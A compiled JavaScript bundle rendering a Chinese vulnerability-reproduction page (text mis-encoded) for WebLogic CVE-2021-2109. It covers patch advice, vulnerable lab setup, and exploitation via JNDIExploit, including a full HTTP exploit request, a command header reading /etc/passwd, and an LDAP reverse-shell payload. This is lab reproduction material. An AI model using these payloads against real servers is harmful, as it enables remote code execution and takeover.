(window.webpackJsonp=window.webpackJsonp||[]).push([[133],{450:function(t,a,s){"use strict";s.r(a);var i=s(7),e=Object(i.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"ğŸ’”-weblogic-ldap-è¿œç¨‹ä»£ç æ‰§è¡Œ"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ğŸ’”-weblogic-ldap-è¿œç¨‹ä»£ç æ‰§è¡Œ"}},[t._v("#")]),t._v(" ğŸ’” Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œ")]),t._v(" "),a("h3",{attrs:{id:"_1-æ¼æ´ä¿¡æ¯"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-æ¼æ´ä¿¡æ¯"}},[t._v("#")]),t._v(" 1ï¼‰æ¼æ´ä¿¡æ¯")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("æ¼æ´åç§°")]),t._v(" "),a("th",[t._v("å—å½±å“ç»„ä»¶")]),t._v(" "),a("th",[t._v("æ¼æ´ç±»å‹")]),t._v(" "),a("th",[t._v("æ¼æ´ç¼–å·")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[t._v("Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œ")]),t._v(" "),a("td",[a("a",{attrs:{href:"https://www.oracle.com/cn/java/weblogic/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Weblogic"),a("OutboundLink")],1)]),t._v(" "),a("td",[t._v("è¿œç¨‹ä»£ç æ‰§è¡Œ")]),t._v(" "),a("td",[t._v("CVE-2021-2109")])])])]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("æ¼æ´ç®€ä»‹")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[t._v("Oracleå®˜æ–¹å‘å¸ƒäº†æ¼æ´è¡¥ä¸ï¼Œä¿®äº†åŒ…æ‹¬ CVE-2021-2109 Weblogic Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åœ¨å†…çš„å¤šä¸ªé«˜å±ä¸¥é‡æ¼æ´ã€‚CVE-2021-2109 ä¸­ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„è¯·æ±‚ï¼Œé€ æˆJNDIæ³¨å…¥ï¼Œæ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œæ§åˆ¶æœåŠ¡å™¨ã€‚"),a("br"),a("br"),a("p",[t._v("å½±å“ç‰ˆæœ¬ï¼š")]),t._v("WebLogic 10.3.6.0.0"),a("br"),t._v("WebLogic 12.1.3.0.0"),a("br"),t._v("WebLogic 12.2.1.3.0"),a("br"),t._v("WebLogic 12.2.1.4.0"),a("br"),t._v("WebLogic 14.1.1.0.0")])])])]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("å‚è€ƒé“¾æ¥")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[a("ol",[a("li",[a("a",{attrs:{href:"http://wiki.peiqi.tech/wiki/webserver/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109.html"}},[t._v("http://wiki.peiqi.tech/wiki/webserver/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109.html")])]),a("li",[a("a",{attrs:{href:"https://cloud.tencent.com/developer/article/1797518"}},[t._v("https://cloud.tencent.com/developer/article/1797518")])])])])])])]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("è¡¥ä¸åŠä¿®å¤æ–¹æ¡ˆ")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[a("ol",[a("li",[t._v("å‡çº§Weblogic Serverè¿è¡Œç¯å¢ƒçš„JDKç‰ˆæœ¬")]),a("li",[t._v("å‡çº§å®˜æ–¹å®‰å…¨è¡¥ä¸ï¼š"),a("a",{attrs:{href:"https://www.oracle.com/security-alerts/cpujan2021.html"}},[t._v("https://www.oracle.com/security-alerts/cpujan2021.html")])])])])])])]),t._v(" "),a("h3",{attrs:{id:"æ¼æ´ç¯å¢ƒ"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#æ¼æ´ç¯å¢ƒ"}},[t._v("#")]),t._v(" æ¼æ´ç¯å¢ƒ")]),t._v(" "),a("h4",{attrs:{id:"æ–¹æ¡ˆä¸€"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#æ–¹æ¡ˆä¸€"}},[t._v("#")]),t._v(" æ–¹æ¡ˆä¸€")]),t._v(" "),a("p",[t._v("ä½¿ç”¨"),a("a",{attrs:{href:"https://github.com/vulhub/vulhub",target:"_blank",rel:"noopener noreferrer"}},[t._v("vulhub"),a("OutboundLink")],1),t._v("æ­å»ºæ¼æ´ç¯å¢ƒ"),a("b",[t._v("ï¼ˆ14882çš„ç¯å¢ƒåŒæ ·é€‚ç”¨äºCVE-2021-2109ï¼‰")])]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("git clone https://github.com/vulhub/vulhub\ncd vulhub/weblogic/CVE-2020-14882\ndocker-compose up -d\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("p",[t._v("è®¿é—®7001ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°ä»¥ä¸‹é¡µé¢"),a("b",[t._v("ï¼ˆè¿˜éœ€è¦ç­‰å¾…ä¸€ä¼šï¼Œå› ä¸ºweblogicéœ€è¦åŠ è½½consoleæ§åˆ¶å°ï¼‰")])]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/01.png",alt:""}}),a("figcaption")]),t._v(" "),a("h4",{attrs:{id:"æ–¹æ¡ˆäºŒ"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#æ–¹æ¡ˆäºŒ"}},[t._v("#")]),t._v(" æ–¹æ¡ˆäºŒ")]),t._v(" "),a("p",[t._v("ä½¿ç”¨"),a("a",{attrs:{href:"https://github.com/fofapro/vulfocus",target:"_blank",rel:"noopener noreferrer"}},[t._v("vulfocus"),a("OutboundLink")],1),t._v("æ­å»ºæ¼æ´ç¯å¢ƒ")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("docker pull vulfocus/weblogic-cve_2021_2109\ndocker run -itd -p 7001:7001 vulfocus/weblogic-cve_2021_2109\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[t._v("è®¿é—®æ§åˆ¶å°é¡µé¢ï¼Œè¿›è¡Œç™»å½•")]),t._v(" "),a("ul",[a("li",[t._v("è´¦å·ï¼šweblogic")]),t._v(" "),a("li",[t._v("å¯†ç ï¼šwelcome1\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/11.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("h3",{attrs:{id:"æ¼æ´å¤ç°"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#æ¼æ´å¤ç°"}},[t._v("#")]),t._v(" æ¼æ´å¤ç°")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("python3 vulcat.py -u <URL> -a weblogic -v cve-2021-2109\n\n# æ³¨æ„, vulcat-v2.0.0ç‰ˆæœ¬åŠä»¥ä¸Š, åº”ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤\npython3 vulcat.py -u <URL> -v cve-2021-2109\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br")])]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/02.png",alt:""}}),a("figcaption")]),t._v(" "),a("p",[t._v("åœ¨DNSLOGå¹³å°å¯ä»¥çœ‹åˆ°ç›¸åº”è®°å½•\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/03.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("p",[t._v("å¦‚æœæƒ³è¿›ä¸€æ­¥åˆ©ç”¨æ¼æ´ï¼Œéœ€è¦ä¸‹è½½è¾…åŠ©å·¥å…·ï¼šhttps://github.com/WhiteHSBG/JNDIExploit/\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/04.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("p",[t._v("è¿è¡ŒJNDIExploitï¼ˆéœ€è¦æå‰å®‰è£…javaç¯å¢ƒï¼‰")]),t._v(" "),a("ul",[a("li",[t._v("ä½¿ç”¨-ié€‰é¡¹æŒ‡å®šæœ¬åœ°IP")]),t._v(" "),a("li",[t._v("é»˜è®¤ç›‘å¬1389å’Œ3456ç«¯å£")])]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("java -jar JNDIExploit-1.4-SNAPSHOT.jar -i <IP>\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("è¿è¡ŒJNDIExploitä¹‹å")]),t._v(" "),a("ul",[a("li",[t._v("å¤åˆ¶æ¼æ´ä¿¡æ¯ä¸­çš„Requestæ•°æ®åŒ…")]),t._v(" "),a("li",[t._v("æ”¾å…¥Burpï¼Œä¿®æ”¹LDAPçš„IPåœ°å€\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/05.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.80;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1\nHost: 192.168.80.132:7001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nReferer: http://192.168.80.132:7001\nOrigin: http://192.168.80.132:7001\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("ldap://192.168.80;1:1389/Basic/WeblogicEcho\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("æ­¤å¤„éœ€è¦æ³¨æ„ï¼ŒCVE-2021-2109æœ‰ä¸€ä¸ªç‰¹æ€§")]),t._v(" "),a("ul",[a("li",[t._v("IPçš„æœ€åä¸€ä¸ª.éœ€è¦æ”¹ä¸ºåˆ†å·;")]),t._v(" "),a("li",[t._v("ä¾‹å¦‚ 192.168.1.1 --\x3e 192.168.1"),a("b",[t._v(";")]),t._v("1\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/07.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("p",[t._v("åœ¨Burpå‘é€æ•°æ®åŒ…ä¹‹åï¼Œå›åˆ°å‘½ä»¤è¡Œï¼Œå¯ä»¥çœ‹åˆ°è¿”å›äº†è®°å½•")]),t._v(" "),a("ul",[a("li",[t._v("è¯´æ˜LDAPæˆåŠŸ\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/08.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.80;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1\nHost: 192.168.80.132:7001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nReferer: http://192.168.80.132:7001\nOrigin: http://192.168.80.132:7001\ncmd: cat /etc/passwd\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br")])]),a("p",[t._v("æ­¤æ—¶å¦‚æœä½ æƒ³æ‰§è¡Œè‡ªå®šä¹‰å‘½ä»¤ï¼Œå¹¶è·å¾—å›æ˜¾")]),t._v(" "),a("ul",[a("li",[t._v("åªéœ€è¦åœ¨æ•°æ®åŒ…ä¸­æ·»åŠ ä¸€ä¸ªHeaders")]),t._v(" "),a("li",[t._v("cmd: ä½ çš„å‘½ä»¤")]),t._v(" "),a("li",[t._v("å¦‚å›¾\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/09.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/10.png",alt:""}}),a("figcaption")]),t._v(" "),a("ul",[a("li",[a("b",[t._v("vulfocusï¼š")]),t._v("\nç”±äºvulfocusçš„é•œåƒæ— æ³•é€šè¿‡æ¼æ´ ç»•è¿‡ç™»å½•é¡µé¢è¿›åå°\næ‰€ä»¥éœ€è¦æå‰ç™»å½•ï¼Œå¹¶åœ¨æ‰«ææ—¶æ·»åŠ Cookie")])]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/12.png",alt:""}}),a("figcaption")]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/13.png",alt:""}}),a("figcaption")]),t._v(" "),a("h4",{attrs:{id:"é¢å¤–å†…å®¹-åå¼¹shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#é¢å¤–å†…å®¹-åå¼¹shell"}},[t._v("#")]),t._v(" é¢å¤–å†…å®¹-åå¼¹shell")]),t._v(" "),a("p",[a("a",{attrs:{href:"https://github.com/WhiteHSBG/JNDIExploit/",target:"_blank",rel:"noopener noreferrer"}},[t._v("JNDIExploit"),a("OutboundLink")],1),t._v("è¿˜æ”¯æŒåå¼¹shellçš„åŠŸèƒ½")]),t._v(" "),a("ul",[a("li",[t._v("åœ¨ä¸€å°"),a("b",[t._v("Linux")]),t._v("æœºå™¨ä¸Šè¿è¡Œncatï¼Œå¦‚å›¾")]),t._v(" "),a("li",[t._v("å¿…é¡»æ˜¯Linuxæœºå™¨ï¼ŒWindowsè¿è¡Œncatæ— æ³•è·å–åå¼¹å›æ¥çš„shellï¼ˆå·¥å…·ä»‹ç»æ˜¯è¿™æ ·è¯´çš„ï¼Œå¤ç°æ—¶ç»è¿‡å®éªŒä¹Ÿå‘ç°Windowsä¸è¡Œï¼‰\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/14.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("p",[t._v("ç„¶åå‘é€Payload")]),t._v(" "),a("ul",[a("li",[t._v("æˆ‘çš„JNDIExploit.jarè¿è¡Œåœ¨192.168.80.1ï¼Œç«¯å£1389")]),t._v(" "),a("li",[t._v("ncatè¿è¡Œåœ¨192.168.80.132ï¼Œç«¯å£12000")])]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("ldap://<ä½ çš„JNDI>/Basic/ReverseShell/<IP>/<PORT>\n\n# ç¤ºä¾‹ï¼š\nldap://192.168.80;1:1389/Basic/ReverseShell/192.168.80.132/12000\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br")])]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/15.png",alt:""}}),a("figcaption")]),t._v(" "),a("p",[t._v("å›åˆ°ncatç»ˆç«¯ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»è¿”å›äº†shell\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/16.png",alt:""}}),a("figcaption")]),a("p")])}),[],!1,null,null,null);a.default=e.exports}}]);